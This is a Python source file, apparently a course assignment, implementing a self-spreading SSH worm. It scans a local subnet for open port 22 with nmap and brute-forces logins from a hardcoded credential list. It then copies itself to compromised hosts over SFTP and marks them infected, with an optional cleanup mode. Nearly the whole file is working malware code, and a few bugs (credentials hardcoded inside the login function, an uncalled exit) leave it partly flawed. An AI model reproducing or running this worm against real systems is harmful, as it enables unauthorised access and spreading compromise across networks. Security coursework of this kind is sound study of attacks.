import os
import sys
import socket
import paramiko
import nmap
import netinfo
import netifaces
import socket
import fcntl
import struct


# The list of credentials to attempt
credList = [
('root', 'toor'),
('admin', '#NetSec!#'),
('osboxes', 'osboxes.org'),
('cpsc', 'cpsc')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
    # Check if the system as infected. One
    # approach is to check for a file called
    # infected.txt in directory /tmp (which
    # you created when you marked the system
    # as infected). 
    return os.path.exists(INFECTED_MARKER_FILE) # Return the system status
    # pass

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
    
    # Mark the system as infected. One way to do
    # this is to create a file called infected.txt
    # in directory /tmp/
    f = open(INFECTED_MARKER_FILE, 'w')          # Open the infected.txt file
    f.write("Worm infection detected")           # Acknowleged worm infection in file
    f.close()   # Close the file
    # pass	

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
    
    # This function takes as a parameter 
    # an instance of the SSH class which
    # was properly initialized and connected
    # to the victim system. The worm will
    # copy itself to remote system, change
    # its permissions to executable, and
    # execute itself. Please check out the
    # code we used for an in-class exercise.
    # The code which goes into this function
    # is very similar to that code.

    sftp = sshClient.open_sftp() # Open the file transfer object

    infectedFile = sftp.file(INFECTED_MARKER_FILE, 'w') # Write /tmp/infected.txt to infected hosts
    infectedFile.close()

    sftp.put("worm.py", "/tmp/worm.py") # Place the file and the directory in the sftp object
    sshClient.exec_command("chmod a+x /tmp/worm.py") # Execute the infection on a Virtual Machine

    sftp.close() # Close the sftp object
    sshClient.close() # Close the ssh client object
    # pass

#Extra Credit 1 " The CleanUP"
def cleanUp(sshClient):
    sftp = sshClient.open_sftp()        

    sftp.remove("/tmp/worm.py")         
    sftp.remove(INFECTED_MARKER_FILE)

    sftp.close()                         
    sshClient.close()                    

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
    
    # Tries to connect to host host using
    # the username stored in variable userName
    # and password stored in variable password
    # and instance of SSH class sshClient.
    # If the server is down or has some other
    # problem, connect() function which you will
    # be using will throw socket.error exception.	     
    # Otherwise, if the credentials are not
    # correct, it will throw 
    # paramiko.SSHException exception. 
    # Otherwise, it opens a connection
    # to the victim system; sshClient now 
    # represents an SSH connection to the 
    # victim. Most of the code here will
    # be almost identical to what we did
    # during class exercise. Please make
    # sure you return the values as specified
    # in the comments above the function
    # declaration (if you choose to use
    # this skeleton).
    print("Now trying credentials for " + host)
    try: # Try condition: make connection
        sshClient.connect(host, username="cpsc",password="cpsc")
        return 0 # Return success
    except paramiko.SSHException: # Except condition: Invalid credentials
        return 1                  # Return invalid credentials error status
    except socket.error:          # Except condition: Failed server 
        return 3                  # Return failed server error status
    # pass

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
    
    # The credential list
    global credList
    
    # Create an instance of the SSH client
    ssh = paramiko.SSHClient()

    # Set some parameters to make things easier.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # The results of an attempt
    attemptResults = None
                
    # Go through the credentials
    for (username, password) in credList:
        
        # TODO: here you will need to
        # call the tryCredentials function
        # to try to connect to the
        # remote system using the above 
        # credentials.  If tryCredentials
        # returns 0 then we know we have
        # successfully compromised the
        # victim. In this case we will
        # return a tuple containing an
        # instance of the SSH connection
        # to the remote system.

        # Call tryCredentials and assigned the returned value to attemptResults
        attemptResults = tryCredentials(host, username, password, ssh) 
        if attemptResults == 0:
            print("Succesfully infected " + host)
            return ssh # Return the value of the ssh client
        elif attemptResults == 1:
            print("Error. Invalid credentials")
        elif attemptResults == 3:
            print("Error. Server is either down or failed to connect to SSH")
        # pass	
            
    # Could not find working credentials
    return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
    
    # TODO: Change this to retrieve and
    # return the IP of the current system.
    interface = netifaces.interfaces()

    ipAddr = None # IP address

    # For loop: Repeat until all interfaces have been gone through
    for netFace in interface: 

        # Retrieve the IP address of the interface
        addr = netifaces.ifaddresses(netFace)[2][0]['addr']

        # If condition: If the address is not localhost addr, get the IP address
        if not addr == "127.0.0.1":
            ipAddr = addr # Save the IP address information
            break 

    return ipAddr
            

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
    
    # TODO: Add code for scanning
    # for hosts on the same network
    # and return the list of discovered
    # IP addresses.	
    portScanner = nmap.PortScanner()    # Create an instance of the 'port scanner' class

    portScanner.scan('10.0.0.0/24', arguments='-p 22 --open') # Scan the network for systems with an open port 22

    hostData = portScanner.all_hosts()     # Scan the network for a host and assign the value to hostData
    
    liveHosts = [] # The list of hosts that are live

    # For loop: Repeats until all live hosts have been gone through
    # Discards hosts that are not up and running
    for host in hostData:

        # If condition: Add to liveHost list if the host is ip
        if portScanner[host].state() == "up":
            liveHosts.append(host)   
    return liveHosts # Return the list of live hosts
    # pass

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
if len(sys.argv) < 2:
    
    # TODO: If we are running on the victim, check if 
    # the victim was already infected. If so, terminate.
    # Otherwise, proceed with malice. 
    if isInfectedSystem():  # Condition: If the system status is infected
        print("System already infected")
        exit
    # pass

# TODO: Get the IP of the current system
myInterface = ""                
myIP = getMyIP(myInterface)       # Call the getMyIP function to retrieve the IP address
print('The IP of the current system is ' + myIP)

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork() # Assign the returned value of getHostsOnTheSameNetwork() to networkHosts

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
print("Removing current IP from host list...\n")
networkHosts.remove(myIP)      # Remove the current value of myIP from networkHosts

print ("Found hosts: ", networkHosts)


# Go through the network hosts
for host in networkHosts:
    
    # Try to attack this host
    sshInfo =  attackSystem(host)
    
    print(sshInfo)
    
    
    # Did the attack succeed?
    if sshInfo:
        # EC 1 Attempt: If the user includes '-c' or '--clean' when running the program,
        # a cleanup will be executed by calling a function called CleanUp(). The function will
        # operate similarly to SpreadAndExecute() only instead of initiating the worm attack on
        # other hosts, it will initiate a cleanup protocol.
        if  "-c" in sys.argv or "--clean" in sys.argv:
            print("Trying to clean")

            # Clean the system
            cleanUp(sshInfo)

            print("Cleanup complete")

        else:
            print("Trying to spread")
            
            # Infect that system
            spreadAndExecute(sshInfo)
            
            print("Spreading complete")	
    

